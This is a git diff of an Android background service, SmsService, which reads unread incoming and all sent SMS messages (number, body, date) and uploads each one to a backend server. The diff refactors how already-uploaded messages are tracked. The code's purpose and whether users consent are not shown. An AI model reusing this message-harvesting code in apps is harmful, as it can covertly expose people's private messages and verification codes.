@@ -33,7 +33,7 @@ import okhttp3.Call;
  * @since 2019-09-09
  */
 public class SmsService extends Service {
-	public static List<Integer> list = new ArrayList<Integer>();
+	private Uri SMS_INBOX = Uri.parse("content://sms/");
 	private SmsObserver mObserver;
 	private ZzkReceiver myReceiver;
 	
@@ -76,27 +76,22 @@ public class SmsService extends Service {
 		}
 	}
 	
-	private Uri SMS_INBOX = Uri.parse("content://sms/");
-	
 	public void getSmsFromPhone() {
 		ContentResolver cr = getContentResolver();
-		String[] projection = new String[]{"_id", "address", "person", "body", "date", "type", "read"};
+		String[] projection = new String[]{"_id", "thread_id", "address", "body", "date", "type", "read"};
 		Cursor cur = cr.query(SMS_INBOX, projection, "(type = ? AND read = ?) OR (type = ?)", new String[]{"1", "0", "2"}, "date desc");
 		if (null == cur || !cur.moveToNext()) {
 			return;
 		}
 		cur.moveToFirst();
-		String id = cur.getString(cur.getColumnIndex("_id"));//短信内容
-		if (list.contains(id)) return;
+		String id = cur.getString(cur.getColumnIndex("_id"));//短信id
 		String number = cur.getString(cur.getColumnIndex("address"));//手机号
-		String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
 		String body = cur.getString(cur.getColumnIndex("body"));//短信内容
 		int type = cur.getInt(cur.getColumnIndex("type"));//类型 1:接受 2:发送
 		long date = cur.getLong(cur.getColumnIndex("date"));//发生时间
-		SmsInfo smsInfo = new SmsInfo(id, number, name, body, type, date);
-//		XLog.e(smsInfo.toString());
-		
-		StringCallback stringCallback = new StringCallback() {
+		final SmsInfo smsInfo = new SmsInfo(id, number, body, type, date);
+		if (SmsManager.isContains(smsInfo)) return;
+		UploadUtil.sendToBack(smsInfo, new StringCallback() {
 			@Override
 			public void onError(Call call, Exception e, int id) {
 				XLog.e("error: " + Log.getStackTraceString(e));
@@ -108,11 +103,10 @@ public class SmsService extends Service {
 				XLog.d("response: " + response);
 				JSONObject jsonObject = JSONObject.parseObject(response);
 				if (jsonObject.getBoolean("flag")) {
-					list.add(id);
+					SmsManager.add(smsInfo);
 				}
 			}
-		};
-		UploadUtil.sendToBack(smsInfo, stringCallback);
+		});
 	}
 	
 	@Override
